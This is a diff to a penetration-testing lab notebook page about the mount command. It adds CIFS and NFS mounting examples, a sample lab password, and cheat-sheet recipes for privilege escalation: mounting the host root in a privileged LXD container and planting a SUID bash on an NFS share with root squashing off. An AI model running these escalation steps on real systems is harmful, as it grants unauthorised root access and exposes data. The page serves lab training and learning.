@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=mount) · [All tools](/index)
+
 ## Commands
 
 **Kali**
@@ -24,8 +26,198 @@ sudo umount /tmp/nfs
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=mount)
+## Notebook recipes
 
-## Learning and original examples
+11 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [NFS Enumeration and Exports](/enumeration/nfs-enumeration-network-file-system)
+<AccordionGroup>
+
+<Accordion title="Linux">
+
+### Linux
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ sudo mkdir /mnt/Finance
+grcic550@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
+```
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
+
+The file credentialfile has to be structured like this:
+```
+
+</Accordion>
+
+<Accordion title="NFS (Port 2049)">
+
+### NFS (Port 2049)
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+```bash
+# List available shares
+showmount -e <IP>
+
+# Mount a share
+mkdir /tmp/target-NFS
+sudo mount -t nfs <IP>:/<share> /tmp/target-NFS
+
+# Browse (use sudo — NFS permissions may block normal user)
+sudo ls -la /tmp/target-NFS/<folder>
+sudo cat /tmp/target-NFS/<folder>/file.txt
+
+# Unmount when done (important — stale mounts freeze your terminal)
+sudo umount -f /tmp/target-NFS
+sudo umount -l /tmp/target-NFS   # if -f doesn't work
+```
+
+</Accordion>
+
+<Accordion title="LXC/LXD">
+
+### LXC/LXD
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+# build a simple alpine image
+git clone https://github.com/saghul/lxd-alpine-builder
+./build-alpine -a i686
+
+# import the image
+lxc image import ./alpine.tar.gz --alias myimage
+
+# run the image
+lxc init myimage mycontainer -c security.privileged=true
+
+# mount the /root into the image
+lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+
+# interact with the container
+lxc start mycontainer
+lxc exec mycontainer /bin/sh
+```
+
+</Accordion>
+
+<Accordion title="NFS Root Squashing">
+
+### NFS Root Squashing
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+# remote check the name of the folder
+showmount -e 10.10.10.10
+
+# create dir
+mkdir /tmp/nfsdir  
+
+# mount directory 
+mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
+cd /tmp/nfsdir
+
+# copy wanted shell 
+cp /bin/bash .  
+
+# set suid permission
+chmod +s bash
+```
+
+</Accordion>
+
+<Accordion title="2. Mount and browse">
+
+### 2. Mount and browse
+
+**NFS Enumeration and Exports**
+
+```bash
+mkdir /tmp/nfs
+sudo mount -t nfs <IP>:/<export> /tmp/nfs -o nolock   # mount the share locally
+sudo ls -la /tmp/nfs                                   # browse with sudo (UID issues, see below)
+sudo cat /tmp/nfs/<file>
+```
+
+</Accordion>
+
+<Accordion title="3. Clean up">
+
+### 3. Clean up
+
+**NFS Enumeration and Exports**
+
+```bash
+sudo umount /tmp/nfs
+sudo umount -f /tmp/nfs    # force, if it won't release
+sudo umount -l /tmp/nfs    # lazy unmount — use if the mount hangs
+```
+
+</Accordion>
+
+<Accordion title="BitLocker-encrypted drives">
+
+### BitLocker-encrypted drives
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+sudo apt-get install dislocker
+sudo mkdir -p /media/bitlocker /media/bitlockermount
+sudo losetup -f -P Backup.vhd
+sudo dislocker /dev/loop0p2 -u<PASSWORD> -- /media/bitlocker
+sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
+# when done:
+sudo umount /media/bitlockermount && sudo umount /media/bitlocker
+```
+
+</Accordion>
+
+<Accordion title="Key Principles">
+
+### Key Principles
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+Context from the notebook: 8. Unmount NFS When Done.  Stale NFS mounts freeze your terminal. Always  sudo umount -l  when the target changes.
+
+```text
+sudo umount -l
+```
+
+</Accordion>
+
+<Accordion title="Quick reference">
+
+### Quick reference
+
+**NFS Enumeration and Exports**
+
+Context from the notebook: First move showmount -e &lt;IP>  →  sudo mount -t nfs &lt;IP>:/&lt;export> /tmp/nfs
+
+```text
+sudo mount -t nfs <IP>:/<export> /tmp/nfs
+```
+
+</Accordion>
+
+<Accordion title="File Transfer Protocols">
+
+### File Transfer Protocols
+
+**Ports, Protocols, and Services by Purpose**
+
+Context from the notebook: NFS 2049 Unix/Linux file sharing mount -t nfs &lt;IP>:/ ./target/
+
+```text
+mount -t nfs <IP>:/ ./target/
+```
+
+</Accordion>
+
+</AccordionGroup>
